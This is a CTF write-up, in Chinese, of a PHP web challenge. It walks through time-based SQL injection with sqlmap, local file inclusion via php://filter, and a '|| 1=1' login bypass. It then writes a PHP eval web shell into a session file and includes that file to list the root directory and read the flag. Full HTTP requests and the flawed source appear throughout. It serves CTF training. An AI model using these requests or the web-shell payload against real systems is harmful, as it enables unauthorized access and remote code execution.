# 0x01 登录框注入

![image-20220630101734835](https://cdn.jsdelivr.net/gh/R1card0-tutu/R1card0-tutu@main/img/202206301017005.png)

sqlmap一把梭

```
POST /verification.php HTTP/1.1
Host: 39.104.50.15:33277
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://39.104.50.15:33277
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://39.104.50.15:33277/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=86bjgupkc5k81qjanefmq3q7c6; user_pref=%2F
Connection: close

username=admin'+AND+(SELECT+7013+FROM+(SELECT(SLEEP(5)))tjwJ)--+CtWG&password=123456

sqlmap -r web.txt --batch --random-agent -v 3 --level 3 --risk 3 --threads 5 -D ctf_cl -T admin_user -C "id,username,pass,email" --dump
```

![image-20220630101820785](https://cdn.jsdelivr.net/gh/R1card0-tutu/R1card0-tutu@main/img/202206301018813.png)

# 0x02 后台文件读取

![image-20220630102023472](https://cdn.jsdelivr.net/gh/R1card0-tutu/R1card0-tutu@main/img/202206301020498.png)

```
POST /bigcarhome.php HTTP/1.1
Host: 39.104.50.15:33277
Content-Length: 70
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://39.104.50.15:33277
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://39.104.50.15:33277/bigcarhome.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F
Connection: close

search=php://filter/read=convert.base64-encode/resource=bigcarhome.php
```

bigcarhome.php源码

```
<?php error_reporting(0);?>?<!DOCTYPE html>?<html>?<head>?<meta charset="utf-8">?<title>文件管理🌟欢迎回来!</title>?<link href="login.css" rel="stylesheet" type="text/css">?<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">?</head>?<body class="loggedin">?<nav class="navtop">?<div>?<h1>后台文件管理系统</h1>?<a href="logout.php">退出</a>?</div>?</nav>?<div class="content">?<h2>Home<br><?=date("Y-m-d H:i:s");?>!</br></h2>?<!-- <p>欢迎回来!!!</p> -->?<br>?<div class="inner_content">?    ?<form method="post" action="bigcarhome.php">?      ?<input type="text" id="search" name"search" placeholder="Search.." name="search">?      ?<button type="submit">Search</button>?    ?</form>?<br>?<br>?<?php?if (isset($_POST['search'])) {?$page = $_POST['search'];?echo "<br>";?echo "<br>";?}?include($page);??>?</div>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<br>?<center>小汽车🚗开起来，嘟嘟嘟嘟～～～～～～～</center>?</div>?</body>?</html>
```

search输入值会被文件包含

读取verification.php源码

```
POST /bigcarhome.php HTTP/1.1
Host: 39.104.50.15:33277
Content-Length: 72
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://39.104.50.15:33277
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://39.104.50.15:33277/bigcarhome.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F
Connection: close

search=php://filter/read=convert.base64-encode/resource=verification.php
```

源码

```
<?php
	error_reporting(0);
	function waf($var)
	{
		$blacklist = array();
		if(preg_match("/select|union|flag|or|ro|where/",$var)){
			die("<script>alert('hackè¡ä¸º')</script>");
		}
		return $var;
	}

	session_start();

	$DATABASE_HOST = '127.0.0.1';
	$DATABASE_USER = 'root';
	$DATABASE_PASS = 'root';
	$DATABASE_NAME = 'ctf_cl';

	$con = mysqli_connect($DATABASE_HOST, $DATABASE_USER, $DATABASE_PASS, $DATABASE_NAME);

	if ( mysqli_connect_errno() ) {
		
		die ('Failed to connect to MySQL: ' . mysqli_connect_error());
	}
	
	if ( !isset($_POST['username'], $_POST['password']) ) {
		header('Location: home.php');
	}
	

	$uname = waf($_POST['username']);
	$passwd = waf($_POST['password']);

	$smt="SELECT * FROM admin_user WHERE username='$uname' and pass='$passwd'";
	$result=mysqli_query($con,$smt);
	$row = mysqli_fetch_array($result,MYSQLI_NUM);
	if ($row) {
		session_regenerate_id();
		$_SESSION['loggedin'] = TRUE;
		$_SESSION['name'] = $_POST['username'];
		$_SESSION['id'] = $id;

		setcookie('user_pref','/',time() + (86400 * 30), "/");

		header('Location: bigcarhome.php');
	} elseif ($_POST['password'] == "admin") {
		echo "<p>Password or username is not correct.</p>";
		header('Location: login.php');

	}else {
		echo "<p>Password or username is not correct.</p>";
		header('Location: login.php');
	}
	
?>
	
```

登录成功username会写入session，写入到/tmp目录下，读取index.php源码发现phpinfo，发现disablefunction里面没禁用eval与scandir

index.php源码

```
<?php
header('Location:'.'login.php');

error_reporting(0);

if (isset($_GET['debug'])) {
    // disable function
    phpinfo();
    exit;
}

function count_string_char($str) {
    $arr = [];
    foreach (str_split($str) as $value) {
        if (!in_array($value, $arr)) {
            array_push($arr, $value);
        }
    }
    return sizeof($arr);
}

if (isset($_POST['cmd']) && is_string($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $c = count_string_char($cmd);
    if ($c > 13) {
        die("$c too long");
    }
    if ( preg_match('/[a-z0-9]|<|>|\\?|\\[|\\]|\\*|@|\\||\\^|~|&|\s/i', $cmd) ) {
        die("nonono");
    }
    eval( "print($cmd);" );
} else {
    exit();
}
		
```

写入eval到session文件

```
POST /verification.php HTTP/1.1
Host: 39.104.50.15:33277
Content-Length: 69
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://39.104.50.15:33277
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://39.104.50.15:33277/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

username=<?php%20eval($_GET["a"]);?>&password=admin'%20||%201=1--%201
```

![](https://cdn.jsdelivr.net/gh/R1card0-tutu/R1card0-tutu@main/img/202206301109884.png)

列目录读取根目录flag文件名

```
POST /bigcarhome.php?a=var_dump(scandir('/')); HTTP/1.1
Host: 39.104.50.15:33277
Content-Length: 43
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://39.104.50.15:33277
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://39.104.50.15:33277/bigcarhome.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F
Connection: close

search=/tmp/sess_tl3hqon8u43nt22gchhmf4ja43
```

![image-20220630110844188](https://cdn.jsdelivr.net/gh/R1card0-tutu/R1card0-tutu@main/img/202206301108252.png)

读取flag值

```
POST /bigcarhome.php?a=var_dump(file_get_contents('/ohhhyoufindflag')); HTTP/1.1
Host: 39.104.50.15:33277
Content-Length: 43
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://39.104.50.15:33277
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://39.104.50.15:33277/bigcarhome.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F
Connection: close

search=/tmp/sess_tl3hqon8u43nt22gchhmf4ja43
```

![image-20220630110954435](https://cdn.jsdelivr.net/gh/R1card0-tutu/R1card0-tutu@main/img/202206301109506.png)

# Tips

- 前台注入
- 万能密码绕过or ||
- session文件包含
- php7 session文件默认目录猜测
- scandir函数列目录